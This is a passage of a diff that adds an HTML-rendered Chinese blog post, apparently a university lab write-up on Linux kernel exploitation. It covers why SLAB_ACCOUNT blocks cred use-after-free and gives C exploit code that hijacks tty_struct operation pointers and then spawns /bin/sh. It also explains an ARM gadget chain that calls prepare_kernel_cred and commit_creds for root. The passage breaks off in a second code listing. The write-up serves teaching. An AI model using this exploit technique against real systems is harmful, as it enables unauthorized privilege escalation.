+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">__init&lt;/span> &lt;span class="nf">cred_init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* allocate a slab in which we can store credentials */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cred_jar&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kmem_cache_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cred_jar&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SLAB_HWCACHE_ALIGN&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">SLAB_PANIC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">4.5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * initialise the credentials stuff
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">__init&lt;/span> &lt;span class="nf">cred_init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* allocate a slab in which we can store credentials */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cred_jar&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kmem_cache_create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cred_jar&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">SLAB_HWCACHE_ALIGN&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">SLAB_PANIC&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">SLAB_ACCOUNT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以注意到，在 slab 的创建 flag 中多了 一个 &lt;code>SLAB_ACCOUNT&lt;/code>，意味着&lt;code>cred_jar&lt;/code>和&lt;code>kmalloc&lt;/code>不再合并，也就是说&lt;code>cred&lt;/code>分配的内存和&lt;code>kmalloc&lt;/code>分配的内存来自两个不同的区域，因此无法使得通过&lt;code>kmalloc&lt;/code>分配的内存和分配给&lt;code>cred&lt;/code>的内存拥有相同的起始地址，也就无法通过UAF控制cred结构体&lt;/p>
+&lt;p>附代码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_STRUCT_SIZE 0x2B8
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_MAGIC 0x5401
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define HACK_CRED_ADDR 0xffff80001083aa84
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">size_t&lt;/span> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">36&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">exp_task2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Jump into exp_task2!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 创建tty_op_buf，将其中的函数指针都修改为HACK_CRED_ADDR
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">36&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HACK_CRED_ADDR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">my_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ptr = %lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 修改ops指针，指向tty_op_buf
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;my_buf + %lu = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">my_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 覆写缓冲区
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">my_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 检查缓冲区是否被修改
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;check ttyy_buf&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tty_buf + %lu = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">tty_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 调用close操作ptmx设备，真正调用的是hack_cred函数
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">init_dev&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">init_ptmx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exp_task2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="task3gadget获取root-shell--思考题4">Task3：gadget获取root shell &amp;amp; 思考题4&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>在task3中我们无法直接调用&lt;code>hack_cred&lt;/code>函数获取root权限，需要使用&lt;code>gadget&lt;/code>，本质上就是通过&lt;code>gadget&lt;/code>控制传参的寄存器，进而依次调用&lt;code>struct cred* root_cred = prepare_kernel_cred(NULL)&lt;/code>和&lt;code>commit_creds(root_cred)&lt;/code>获取root权限&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>我们先观察一下这几个&lt;code>gadget&lt;/code>分别做了什么&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>zju_gadget1:&lt;/code> 将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处&lt;/li>
+&lt;li>&lt;code>zju_gadget2:&lt;/code> 将x0置0，将[x2 + 0x28]地址的值赋值给x1，跳转到x1储存的地址处&lt;/li>
+&lt;li>&lt;code>zju_gadget3:&lt;/code> 直接返回&lt;/li>
+&lt;li>之后我们的思路就明确了，我们首先通过&lt;code>zju_gadget3&lt;/code>获取&lt;code>ty_struct&lt;/code>的地址，之后通过&lt;code>zju_gadget2&lt;/code>调用&lt;code>prepare_kernel_cred&lt;/code>方法，获取返回值，之后再调用&lt;code>commit_creds&lt;/code>方法获取root权限&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>首先我们需要获取&lt;code>tyy_struct&lt;/code>的地址&lt;/p>
+&lt;ol>
+&lt;li>在之前的实验中，尽管我们可以修改&lt;code>tyy_struct&lt;/code>结构的值，但是我们需要在之后将&lt;code>tty_struct&lt;/code>的地址作为参数传入&lt;code>gadget&lt;/code>，因此我们需要得到它的地址&lt;/li>
+&lt;li>在arm中，函数的第一个参数会保存在x0中，函数返回的值也会保存在x0中，而我们观察&lt;code>ioctl&lt;/code>方法&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// x0 = tty_struct_of_fd, x1 = p1, x2 = p2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="nf">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">p1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ioctl_operation&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_struct_of_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// x0 = &amp;amp;tty, x1 = cmd, x2 = arg
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">ioctl&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tty&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">arg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以其会将参数按照顺序传入&lt;code>ioctl_operation&lt;/code>，之后在&lt;code>ioctl&lt;/code>函数指针中，第一个参数就是&lt;code>tty_struct&lt;/code>的指针，因此x0就是&lt;code>tty_struct&lt;/code>的起始地址&lt;/p>
+&lt;ol start="3">
+&lt;li>我们将&lt;code>ioctl&lt;/code>方法覆写为&lt;code>zju_gadget3&lt;/code>，&lt;code>return&lt;/code>得到的返回值(x0)就是&lt;code>tty_struct&lt;/code>的起始地址；需要注意由于返回值为int类型，在赋值为64bit类型变量后，需要手动将最高16位赋值为&lt;code>0xffff&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>
+&lt;p>之后我们需要调用&lt;code>prepare_kernel_gadget&lt;/code>函数&lt;/p>
+&lt;ol>
+&lt;li>首先这个函数的参数需要是&lt;code>NULL&lt;/code>，而&lt;code>NULL&lt;/code>在C中就是0，因此我们可以想到利用&lt;code>zju_gadget2&lt;/code>，同时&lt;code>x0&lt;/code>正好作为&lt;code>prepare_kernel_gadget&lt;/code>的第一个参数&lt;/li>
+&lt;li>如何调用&lt;code>prepare_kernel_gadget&lt;/code>函数？可以发现&lt;code>zju_gadget2&lt;/code>将[x2 + 0x28]地址的值赋值给x1，之后跳转到x1储存的地址处，那么我们就可以将&lt;code>prepare_kernel_gadget&lt;/code>的地址放到[x2 + 0x28]&lt;/li>
+&lt;li>x2是可以通过&lt;code>ioctl&lt;/code>传入的参数，也就是p2，那么我们就可以直接传入&lt;code>tty_struct&lt;/code>的起始地址，将[addr+0x28]处的地址覆写成&lt;code>prepare_kernel_gadget&lt;/code>的地址即可&lt;/li>
+&lt;li>最后将返回值保存，之后需要传入&lt;code>commit_creds&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>
+&lt;p>之后就是调用&lt;code>commit_creds&lt;/code>，和之前一样的思路，在&lt;code>zju_gadget1&lt;/code>中，将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处；因此我们可以通过覆写 [x0 + 0x38]地址处的值为&lt;code>commit_creds&lt;/code>的地址对其调用，同时将&lt;code>prepare_kernel_cred&lt;/code>的返回值作为参数传入&lt;code>x2&lt;/code>，在&lt;code>zju_gadget1&lt;/code>中传入&lt;code>x0&lt;/code>，进而调用函数&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;blockquote>
+&lt;p>Q4. 为什么第二步可以直接ret获取到 &lt;code>tty_struct&lt;/code>结构体的地址？ret 执行前后的控制流是什么样的？&lt;/p>
+&lt;/blockquote>
+&lt;p>根据之前的分析，当调用&lt;code>int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg)&lt;/code>函数签名时，第一个参数就到 &lt;code>tty_struct&lt;/code>结构体的地址，通过x0寄存器传参；而我们实际上调用的是&lt;code>zju_gadget3&lt;/code>，此时传参是正常的，但是在函数体中直接&lt;code>return&lt;/code>，没有修改x0寄存器的值；而arm架构中函数的返回值也储存在x0寄存器中，函数返回值也就是 &lt;code>tty_struct&lt;/code>结构体的地址&lt;/p>
+&lt;p>控制流：&lt;code>my_function&lt;/code> -&amp;gt; &lt;code>int ioctl(int fd, unsigned long int p1, void *p2)&lt;/code> -&amp;gt; &amp;hellip; &lt;code>tty_optarions.ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg)&lt;/code> -&amp;gt; &lt;code>zju_gadget3&lt;/code> -&amp;gt; &amp;hellip; -&amp;gt; &lt;code>my_function&lt;/code>&lt;/p>
+&lt;p>附代码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
